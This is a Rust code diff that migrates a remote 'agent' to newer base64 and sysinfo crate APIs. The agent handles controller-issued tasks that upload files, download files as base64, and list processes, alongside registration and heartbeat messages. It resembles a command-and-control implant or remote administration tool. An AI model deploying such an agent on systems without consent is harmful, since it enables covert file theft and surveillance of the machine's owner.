@@ -1,7 +1,7 @@
 use crate::config::AgentConfig;
 use crate::protocol::{AgentRegistration, HeartbeatRequest, TaskMessage, TaskResult, TelemetryPayload};
 use crate::state::AgentState;
-use base64;
+use base64::{engine::general_purpose, Engine as _};
 use hostname::get;
 use log::{error, info};
 use rand::Rng;
@@ -10,7 +10,7 @@ use std::env;
 use std::fs;
 use std::path::Path;
 use std::time::{Duration, SystemTime, UNIX_EPOCH};
-use sysinfo::{ProcessExt, System, SystemExt};
+use sysinfo::{ProcessesToUpdate, System};
 use tokio::process::Command;
 use tokio::time::timeout;
 
@@ -151,12 +151,15 @@ async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
 
             let path = Path::new(&task.args[0]);
             let data = task.args[1].as_str();
-            match base64::decode(data) {
+            match general_purpose::STANDARD.decode(data) {
                 Ok(bytes) => match fs::write(path, bytes) {
                     Ok(_) => build_result("success", "uploaded".to_string(), None),
                     Err(e) => build_result("error", "".to_string(), Some(e.to_string())),
                 },
-                Err(e) => build_result("error", "".to_string(), Some(e.to_string())),
+                Err(e) => {
+                    let e: base64::DecodeError = e;
+                    build_result("error", "".to_string(), Some(e.to_string()))
+                }
             }
         }
         "download" => {
@@ -170,7 +173,7 @@ async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
 
             let path = Path::new(&task.args[0]);
             match fs::read(path) {
-                Ok(bytes) => build_result("success", base64::encode(&bytes), None),
+                Ok(bytes) => build_result("success", general_purpose::STANDARD.encode(&bytes), None),
                 Err(e) => build_result("error", "".to_string(), Some(e.to_string())),
             }
         }
@@ -192,10 +195,14 @@ async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
         }
         "ps" => {
             let mut sys = System::new_all();
-            sys.refresh_processes();
+            sys.refresh_processes(ProcessesToUpdate::All, true);
             let mut lines = Vec::new();
             for (pid, process) in sys.processes() {
-                lines.push(format!("{}\t{}\n", pid, process.name()));
+                lines.push(format!(
+                    "{}\t{}\n",
+                    pid,
+                    process.name().to_string_lossy(),
+                ));
             }
             build_result("success", lines.join(""), None)
         }
